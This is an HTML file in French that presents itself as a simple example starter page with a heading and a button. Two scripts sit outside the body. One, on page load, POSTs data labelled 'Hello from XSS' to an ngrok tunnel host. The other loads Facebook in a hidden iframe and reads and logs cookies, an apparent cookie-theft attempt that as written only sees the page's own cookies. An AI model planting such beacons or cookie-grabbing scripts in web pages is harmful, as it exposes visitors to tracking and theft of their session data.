<!DOCTYPE html>

<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ma Page HTML Simple</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 20px;
        }
        h1 {
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        button {
            display: inline-block;
            padding: 10px 20px;
            font-size: 16px;
            color: #fff;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
    
<script>
document.addEventListener("DOMContentLoaded", function() {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://49b7-2a02-8429-811a-201-15c9-ea64-1cbb-922b.ngrok-free.app/Hi", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            console.log("Data sent successfully.");
        }
    };
    var formData = new FormData();
    formData.append("data", "Hello from XSS");
    xhr.send(formData);
});
</script>
    
    <script>
  // Create an iframe element
  var iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  document.body.appendChild(iframe);
  
  // Set the iframe source to Facebook
  iframe.src = 'https://www.facebook.com';
  
  // Wait for the iframe to load
  iframe.onload = function() {
    // Use setTimeout to delay the execution
    setTimeout(function() {
      // Get the cookies from the iframe
      var cookies = document.cookie;
      console.log(cookies);
      
      // Remove the iframe
      document.body.removeChild(iframe);
    }, 1000); // Adjust the delay as needed
  };
</script>
<body>

    <div class="container">
        <h1>Bienvenue sur ma page HTML</h1>
        <h2>Sous-titre</h2>
        <p>Ceci est un exemple de page HTML simple. Vous pouvez utiliser cette structure pour créer des pages web basiques et ajouter du contenu selon vos besoins.</p>
        <button onclick="alert('Bouton cliqué !')">Cliquez ici</button>
    </div>

</body>
  
</html>
